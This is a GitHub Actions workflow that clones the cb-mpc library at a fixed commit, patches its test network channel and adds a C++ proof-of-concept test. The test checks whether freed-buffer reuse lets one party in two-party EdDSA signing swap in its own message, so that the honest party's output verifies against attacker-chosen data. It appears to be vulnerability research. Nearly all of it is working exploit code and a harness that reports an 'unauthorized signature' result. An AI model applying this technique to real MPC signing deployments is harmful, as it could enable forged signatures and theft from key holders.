name: CBMPC EdDSA Network Reuse Substitution V38

on:
  workflow_dispatch:
  push:
    paths:
      - '.github/workflows/cbmpc-eddsa-network-reuse-substitution-v38.yml'

permissions:
  contents: read

jobs:
  verdict:
    runs-on: ubuntu-24.04
    timeout-minutes: 50
    steps:
      - name: Clone current cb-mpc HEAD
        shell: bash
        run: |
          set -euo pipefail
          git clone https://github.com/coinbase/cb-mpc.git cb-mpc >/dev/null 2>&1
          cd cb-mpc
          git checkout fdbb60346757271d5e0241f417e55dc8f289573c >/dev/null 2>&1
          git submodule update --init --recursive >/dev/null 2>&1
      - name: Add network-driven public EdDSA2P substitution PoC
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          from pathlib import Path
          p=Path('cb-mpc/tests/utils/local_network/channel.cpp')
          p.write_text(p.read_text().replace('    delete queue.front();','    test_message_buffer_t::free(queue.front());'))
          PY
          cat >> cb-mpc/tests/unit/api/test_eddsa2pc.cpp <<'CPP'

          #include <fstream>

          namespace {
          class v38_capture_send_transport_t final : public coinbase::api::data_transport_i {
           public:
            explicit v38_capture_send_transport_t(std::shared_ptr<mpc_net_context_t> ctx) : ctx_(std::move(ctx)) {}
            void arm() { armed_=true; captured_=false; first_size_=0; }
            int first_size() const { return first_size_; }
            error_t send(coinbase::api::party_idx_t receiver, mem_t msg) override {
              if (armed_ && !captured_) { first_size_=msg.size; captured_=true; }
              ctx_->send(receiver,msg); return SUCCESS;
            }
            error_t receive(coinbase::api::party_idx_t sender, buf_t& msg) override { return ctx_->receive(sender,msg); }
            error_t receive_all(const std::vector<coinbase::api::party_idx_t>& senders,std::vector<buf_t>& msgs) override {
              std::vector<coinbase::mpc::party_idx_t> s; for(auto x:senders)s.push_back(static_cast<coinbase::mpc::party_idx_t>(x));
              return ctx_->receive_all(s,msgs);
            }
           private:
            std::shared_ptr<mpc_net_context_t> ctx_; bool armed_=false,captured_=false; int first_size_=0;
          };

          class v38_observe_receive_transport_t final : public coinbase::api::data_transport_i {
           public:
            explicit v38_observe_receive_transport_t(std::shared_ptr<mpc_net_context_t> ctx) : ctx_(std::move(ctx)) {}
            void arm(const_byte_ptr freed) { freed_=freed; armed_=true; reused_=false; observed_size_=0; }
            bool reused() const { return reused_; }
            int observed_size() const { return observed_size_; }
            error_t send(coinbase::api::party_idx_t receiver, mem_t msg) override { ctx_->send(receiver,msg); return SUCCESS; }
            error_t receive(coinbase::api::party_idx_t sender, buf_t& msg) override {
              const error_t rv=ctx_->receive(sender,msg);
              if(!rv && armed_ && observed_size_==0){ observed_size_=msg.size(); reused_=(msg.data()==freed_); }
              return rv;
            }
            error_t receive_all(const std::vector<coinbase::api::party_idx_t>& senders,std::vector<buf_t>& msgs) override {
              std::vector<coinbase::mpc::party_idx_t> s; for(auto x:senders)s.push_back(static_cast<coinbase::mpc::party_idx_t>(x));
              return ctx_->receive_all(s,msgs);
            }
           private:
            std::shared_ptr<mpc_net_context_t> ctx_; const_byte_ptr freed_=nullptr; bool armed_=false,reused_=false; int observed_size_=0;
          };
          }

          TEST(ApiEdDSA2pc, NetworkDrivenMessageSubstitutionVerdictV38) {
            auto c1=std::make_shared<mpc_net_context_t>(0); auto c2=std::make_shared<mpc_net_context_t>(1);
            std::vector<std::shared_ptr<mpc_net_context_t>> peers={c1,c2}; c1->init_with_peers(peers); c2->init_with_peers(peers);
            local_api_transport_t d1(c1); local_api_transport_t d2(c2);
            const coinbase::api::job_2p_t dj1{party_t::p1,"p1","p2",d1};
            const coinbase::api::job_2p_t dj2{party_t::p2,"p1","p2",d2};
            buf_t key1,key2; error_t rv1=UNINITIALIZED_ERROR,rv2=UNINITIALIZED_ERROR;
            run_2pc(c1,c2,
              [&]{return coinbase::api::eddsa_2p::dkg(dj1,curve_id::ed25519,key1);},
              [&]{return coinbase::api::eddsa_2p::dkg(dj2,curve_id::ed25519,key2);},rv1,rv2);
            ASSERT_EQ(rv1,SUCCESS); ASSERT_EQ(rv2,SUCCESS);

            // Calibration only observes the protocol's first P2->P1 serialized message size.
            c1->reset(); c2->reset();
            local_api_transport_t cal1(c1); v38_capture_send_transport_t cal2(c2); cal2.arm();
            const coinbase::api::job_2p_t cj1{party_t::p1,"p1","p2",cal1};
            const coinbase::api::job_2p_t cj2{party_t::p2,"p1","p2",cal2};
            buf_t cm(64); for(int i=0;i<cm.size();++i)cm[i]=static_cast<uint8_t>(0x31+i);
            buf_t cs1,cs2;
            run_2pc(c1,c2,
              [&]{return coinbase::api::eddsa_2p::sign(cj1,key1,cm,cs1);},
              [&]{return coinbase::api::eddsa_2p::sign(cj2,key2,cm,cs2);},rv1,rv2);
            ASSERT_EQ(rv1,SUCCESS); ASSERT_EQ(rv2,SUCCESS);
            const int wire_size=cal2.first_size(); ASSERT_GT(wire_size,36);

            // Attack run: honest P1 uses an otherwise-normal transport. The observer only records
            // whether the transport's ordinary receive allocation reused P1's just-freed message chunk.
            c1->reset(); c2->reset();
            v38_observe_receive_transport_t t1(c1); local_api_transport_t t2(c2);
            const coinbase::api::job_2p_t j1{party_t::p1,"p1","p2",t1};
            const coinbase::api::job_2p_t j2{party_t::p2,"p1","p2",t2};

            buf_t victim(wire_size), attacker_zero(wire_size);
            for(int i=0;i<wire_size;++i){ victim[i]=static_cast<uint8_t>((i*5+7)&0xff); attacker_zero[i]=0; }
            const buf_t original=victim;
            const_byte_ptr freed_addr=victim.data();
            mem_t victim_view=victim;
            t1.arm(freed_addr);
            buf_t p2sig;
            run_2pc(c1,c2,
              [&]{return coinbase::api::eddsa_2p::sign(j1,key1,victim_view,victim);},
              [&]{return coinbase::api::eddsa_2p::sign(j2,key2,attacker_zero,p2sig);},rv1,rv2);

            buf_t pub; ASSERT_EQ(coinbase::api::eddsa_2p::get_public_key_compressed(key1,pub),SUCCESS);
            coinbase::crypto::ecc_point_t Q; ASSERT_EQ(Q.from_bin(coinbase::crypto::curve_ed25519,pub),SUCCESS);
            const coinbase::crypto::ecc_pub_key_t vk(Q);
            const error_t attacker_verify=(victim.size()==64)?vk.verify(attacker_zero,victim):E_GENERAL;
            const error_t original_verify=(victim.size()==64)?vk.verify(original,victim):E_GENERAL;
            const bool substituted=t1.reused() && rv1==SUCCESS && rv2==SUCCESS && victim.size()==64 &&
                                   attacker_verify==SUCCESS && original_verify!=SUCCESS;
            std::ofstream out("/code/v38-verdict.txt",std::ios::trunc);
            out<<"commit=fdbb60346757271d5e0241f417e55dc8f289573c wire_size="<<wire_size
               <<" observed_size="<<t1.observed_size()<<" network_reused="<<(t1.reused()?1:0)
               <<" rv1="<<rv1<<" rv2="<<rv2<<" sig_size="<<victim.size()
               <<" attacker_verify="<<attacker_verify<<" original_verify="<<original_verify
               <<" substituted="<<(substituted?1:0)<<"\n";
          }
          CPP
      - name: Run release network-driven exploit
        shell: bash
        run: |
          set -euo pipefail
          cd cb-mpc
          make image >/tmp/image-build.log 2>&1
          set +e
          timeout 42m docker run --rm -v "$PWD":/code -t cb-mpc bash -lc 'make test filter=ApiEdDSA2pc.NetworkDrivenMessageSubstitutionVerdictV38' >/tmp/test.log 2>&1
          status=$?
          set -e
          echo "test_exit=$status"
          if [ -f v38-verdict.txt ]; then cat v38-verdict.txt; else echo verdict_missing=1; fi
          sub=$(sed -n 's/.*substituted=\([0-9][0-9]*\).*/\1/p' v38-verdict.txt 2>/dev/null || true)
          if [ "${sub:-0}" -eq 1 ]; then echo 'EDDSA_NETWORK_DRIVEN_UNAUTHORIZED_SIGNATURE_CANDIDATE=1'; exit 2; fi
          if [ "$status" -ne 0 ]; then echo V38_TEST_OR_BUILD_FAILURE=1; tail -n 160 /tmp/test.log; exit 1; fi
          echo EDDSA_NETWORK_DRIVEN_UNAUTHORIZED_SIGNATURE_CANDIDATE=0
